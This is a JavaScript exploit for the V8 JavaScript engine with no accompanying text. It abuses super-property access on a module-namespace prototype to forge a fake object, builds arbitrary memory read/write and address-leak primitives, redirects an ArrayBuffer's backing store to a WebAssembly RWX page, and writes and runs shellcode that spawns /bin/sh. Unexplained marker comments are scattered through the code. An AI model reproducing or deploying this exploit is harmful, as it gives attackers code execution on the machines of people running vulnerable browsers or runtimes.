import('./1.mjs').then((foo) => {
    
    var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasm_module = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_module, {});
    var shell = wasm_instance.exports.main;
    var f64 = new Float64Array(1);//XSD
    
    var bigUint64 = new BigUint64Array(f64.buffer);
    function ftoi(f){
        f64[0] = f;
        return bigUint64[0];
    }
    function itof(i){
        bigUint64[0] = BigInt(i);
        return f64[0];
    }
    function itof64(h, l){
        return itof((BigInt(h) << 32n) + BigInt(l))
    }
    function ftoh(f){
        return itoh(ftoi(f));
    }
    function itoh(i){
        var pad = 16;
        if (BigInt(i) < 0){
            i = BigInt(i) & 0xffffffffn    
        }
        if (BigInt(i) >> 32n == 0){
            pad = 8;
        }
        return '0x'+i.toString(16).padStart(pad, "0");
    }
 
    let arr_addr = 0x081c2119 + 0x80000
    let arr_index0_addr = arr_addr + 8
    let arr = Array(0x7bd0)
    arr.fill(1.1)
    fake_obj_addr = arr_addr + 0x100
    fake_obj_map_index = (fake_obj_addr - arr_index0_addr) / 8
    fake_obj_elm_index = fake_obj_map_index + 1
    arr[fake_obj_map_index] = itof64(0x0800222d, 0x08203ae1)
    arr[fake_obj_elm_index] = itof64(0x00001000, arr_addr - 8)
    let obj_arr = Array(0xf7a0)
    let obj_arr_addr = 0x081c2119 + 0xc0000
    obj_arr.fill({"a":"b"})
    class C {
        m() {
            return super.bar;
        }
    }
    var obj_prop_ut_fake = {};
    for (var i = 0x0; i < 0x11; i++) {
        obj_prop_ut_fake['x'+i] = itof64(0, fake_obj_addr)
    }
    C.prototype.__proto__ = foo;
    let c = new C();
    function trigger() {
        c.x0 = obj_prop_ut_fake;
        let a = c.m()//*X1
        return a;
    }
    for (var i=0;i<0x20;i++) {
        trigger()//XXY
    }
    let fake_obj = trigger()//XXF
    function read(addr, n=1) {
        addr = BigInt(addr)
        data = []
        arr[fake_obj_elm_index] = itof64(0x00001000, addr - 8n)
        for (let i = 0; i < n; i++) {
            v = fake_obj[i]
            data.push(v)
            console.log("read: ", itoh(addr - 8n + BigInt(i * 8)), ftoh(v))
        }
        return data
    }
    function write(addr, data) {
        addr = BigInt(addr)
        arr[fake_obj_elm_index] = itof64(0x00001000, addr - 8n)
        fake_obj[0] = itof(data)
        console.log('write: ', itoh(addr - 8n), itoh(data));
    }
    function addrOf(obj) {
        obj_arr[0] = obj
        let addr = read(obj_arr_addr + 8)[0]
        return (ftoi(addr) & 0xffffffffn)
    }
    function write_shellcode(shellcode, rwx_addr){
        var buf = new ArrayBuffer(shellcode.length * 8);
        var data_view = new DataView(buf);
        var buf_addr = addrOf(buf) & 0xffffffffn;
        console.log('buf address: ', itoh(buf_addr));
        var back_store_addr_l = ftoi(read(buf_addr + 24n)[0]);
        var back_store_addr_h = ftoi(read(buf_addr + 32n)[0]);
        var rwx_addr_h = rwx_addr >> 32n;
        var rwx_addr_l = rwx_addr & 0xffffffffn;
        var new_bs_addr_l = (back_store_addr_l & 0xffffffffn) + (rwx_addr_l << 32n);
        var new_bs_addr_h = (back_store_addr_h >> 32n << 32n) + (rwx_addr_h);
        write(buf_addr + 24n, new_bs_addr_l);
        write(buf_addr + 32n, new_bs_addr_h);
         //XXO,XXM,XXXZ,OXO,ZPX
        for (var i = 0; i < shellcode.length; i++){
          data_view.setFloat64(i * 8, itof(shellcode[i]), true);
        }
    }
    var wasm_addr = addrOf(wasm_instance);
    console.log('wasm instance address: ', itoh(wasm_addr));
    var rwx_addr = read((wasm_addr + 0x60n))[0];
    console.log('rwx address: ', ftoh(rwx_addr));
    var shellcode = [
        0x2fbb485299583b6an,
        0x5368732f6e69622fn,
        0x050f5e5457525f54n
    ];//XX.5
    write_shellcode(shellcode, ftoi(rwx_addr));
    shell();
})
                                    
